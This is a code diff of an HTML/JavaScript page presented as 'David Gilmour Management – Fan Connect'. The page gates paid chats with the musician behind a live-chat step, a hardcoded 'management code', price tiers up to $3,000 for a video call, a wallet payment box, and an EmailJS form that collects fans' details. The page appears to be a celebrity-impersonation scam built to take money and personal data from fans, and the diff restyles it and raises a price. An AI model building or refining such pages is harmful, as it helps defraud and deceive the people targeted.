@@ -6,53 +6,37 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #1a1a1a, #0d7377, #14ffec);
-      background-size: 400% 400%;
-      animation: gradientBG 15s ease infinite;
+      background: url('https://images.unsplash.com/photo-1521737604893-d14cc237f11d?ixlib=rb-4.0.3&auto=format&fit=crop&w=1500&q=80') no-repeat center center/cover;
       margin: 0;
       padding: 0;
       color: white;
       text-align: center;
     }
-
-    @keyframes gradientBG {
-      0% {background-position: 0% 50%;}
-      50% {background-position: 100% 50%;}
-      100% {background-position: 0% 50%;}
-    }
-
     header {
-      background: rgba(0, 0, 0, 0.8);
+      background: rgba(0, 0, 0, 0.7);
       padding: 20px;
       font-size: 36px;
       font-weight: bold;
-      text-shadow: 0px 0px 10px #14ffec;
     }
-
     section {
-      background: rgba(0, 0, 0, 0.7);
+      background: rgba(0, 0, 0, 0.6);
       margin: 20px auto;
       padding: 30px;
       border-radius: 12px;
       width: 80%;
       max-width: 700px;
       font-size: 20px;
-      box-shadow: 0px 0px 20px rgba(20,255,236,0.3);
     }
-
     h2 {
       font-size: 28px;
       margin-bottom: 10px;
-      color: #14ffec;
     }
-
     label {
       display: block;
       margin-top: 15px;
       font-size: 20px;
       text-align: left;
     }
-
     input, select, button, textarea {
       width: 100%;
       padding: 12px;
@@ -61,42 +45,29 @@
       border-radius: 6px;
       border: none;
     }
-
     button {
-      background: #14ffec;
-      color: #111;
+      background: green;
+      color: white;
       cursor: pointer;
       font-size: 20px;
       margin-top: 20px;
-      transition: all 0.3s ease;
-      font-weight: bold;
     }
-
-    button:hover {
-      background: #0d7377;
-      color: #fff;
-      box-shadow: 0px 0px 15px #14ffec;
-    }
-
     #chatSection {
       display: none;
       margin-top: 20px;
     }
-
     textarea {
       width: 100%;
       height: 150px;
       font-size: 18px;
       padding: 10px;
     }
-
     #paymentPage {
       display: none;
-      background: rgba(0,0,0,0.9);
+      background: rgba(0,0,0,0.8);
       padding: 20px;
       border-radius: 12px;
     }
-
     .wallet-box {
       background: #222;
       padding: 15px;
@@ -112,10 +83,9 @@
     David Gilmour Management – Fan Connect
   </header>
 
-  <!-- Step 1: Short Chat -->
+  <!-- Step 1 -->
   <section id="step1">
     <h2>Step 1: Start Short Live Chat</h2>
-    <p>Fans can start a short conversation with our management team before proceeding.</p>
     <button onclick="startShortChat()">Start Live Chat</button>
   </section>
 
@@ -125,23 +95,23 @@
     After your short chat, you’ll be given a special code to continue.</p>
   </section>
 
-  <!-- Step 2: Management Code Input -->
-  <section id="step2" style="display:none;">
+  <!-- Step 2 -->
+  <section id="step2" style="display:none; margin-top:20px;">
     <h2>Step 2: Enter Management Code</h2>
     <input type="text" id="managementCode" placeholder="Enter code from management">
-    <button onclick="verifyManagementCode()">Proceed to Payment</button>
+    <button onclick="verifyManagementCode()">Submit Code</button>
   </section>
 
   <!-- Payment Options -->
   <section id="paymentSection" style="display:none;">
-    <h2>Step 3: Select Chat Option</h2>
+    <h2>Select Chat Option</h2>
     <select id="paymentOption">
       <option value="">-- Select Chat Type --</option>
       <option value="100">30 Minutes Chat – $100</option>
       <option value="250">1 Hour 30 Minutes Chat – $250</option>
-      <option value="1000">Voice/Video Call – $1,000</option>
+      <option value="3000">Voice/Video Call – $3,000</option>
     </select>
-    <button onclick="makePayment()">Proceed to Payment</button>
+    <button onclick="makePayment()">Make Payment</button>
   </section>
 
   <!-- Payment Page -->
@@ -152,9 +122,9 @@
     <div id="walletBox" class="wallet-box"></div>
   </section>
 
-  <!-- Details Form -->
-  <section id="detailsForm" style="display:none;">
-    <h2>Step 4: Submit Your Details</h2>
+  <!-- Step 3 -->
+  <section id="step3" style="display:none;">
+    <h2>Step 3: Submit Your Details</h2>
     <form id="paymentForm">
       <label for="name">Your Name:</label>
       <input type="text" id="name" name="user_name" required>
@@ -169,15 +139,15 @@
     </form>
   </section>
 
-  <!-- Access Code Unlock -->
-  <section id="step3" style="display:none;">
-    <h2>Step 5: Enter Your Access Code</h2>
+  <section id="accessCodeSection" style="display:none;">
+    <h2>Step 4: Enter Your Access Code</h2>
     <input type="text" id="accessCode" placeholder="Enter code here">
     <button onclick="verifyCode()">Unlock Chat</button>
   </section>
 
+  <!-- Chat Section -->
   <section id="chatSection">
-    <h2>🎤 Live Chat with David</h2>
+    <h2>Live Chat</h2>
     <textarea placeholder="Start chatting..."></textarea>
   </section>
 
@@ -189,7 +159,7 @@
     })();
 
     let generatedCode = "";
-    let managementCode = "MGMT2025"; // fixed code you give in short chat
+    let managementCode = "MGMT2025"; // code management gives in short chat
 
     function startShortChat() {
       // Show Tawk.to widget
@@ -215,13 +185,13 @@
     }
 
     // Check on page load
-    window.onload = function() {
+    window.addEventListener("load", function() {
       if(localStorage.getItem("shortChatEnded") === "true") {
         document.getElementById("step1").style.display = "none";
         document.getElementById("chatInstruction").style.display = "none";
         document.getElementById("step2").style.display = "block";
       }
-    };
+    });
 
     function verifyManagementCode() {
       let code = document.getElementById("managementCode").value;
@@ -237,7 +207,7 @@
       let option = document.getElementById("paymentOption").value;
       if(option) {
         document.getElementById("paymentPage").style.display = "block";
-        document.getElementById("detailsForm").style.display = "block";
+        document.getElementById("step3").style.display = "block";
         window.scrollTo(0,document.body.scrollHeight);
       } else {
         alert("Select a chat option first.");
@@ -285,7 +255,7 @@
       emailjs.send("service_offzcjp", "template_5bcdhpd", templateParams)
         .then(function(response) {
           alert("Details submitted! An access code has been sent to your email.");
-          document.getElementById("step3").style.display = "block";
+          document.getElementById("accessCodeSection").style.display = "block";
           window.scrollTo(0,document.body.scrollHeight);
         }, function(error) {
           alert("FAILED to send email. Try again. " + JSON.stringify(error));
@@ -308,19 +278,20 @@
   <script type="text/javascript">
   var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
   (function(){
-  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-  s1.async=true;
-  s1.src='https://embed.tawk.to/68a0948fa4fc79192a7c8dc2/1j2pk8kgl';
-  s1.charset='UTF-8';
-  s1.setAttribute('crossorigin','*');
-  s0.parentNode.insertBefore(s1,s0);
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/68a0948fa4fc79192a7c8dc2/1j2pk8kgl';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
   })();
 
   // Hide widget initially
   Tawk_API.onLoad = function(){
-      Tawk_API.hideWidget();
+    Tawk_API.hideWidget();
   };
   </script>
   <!--End of Tawk.to Script-->
+
 </body>
 </html>
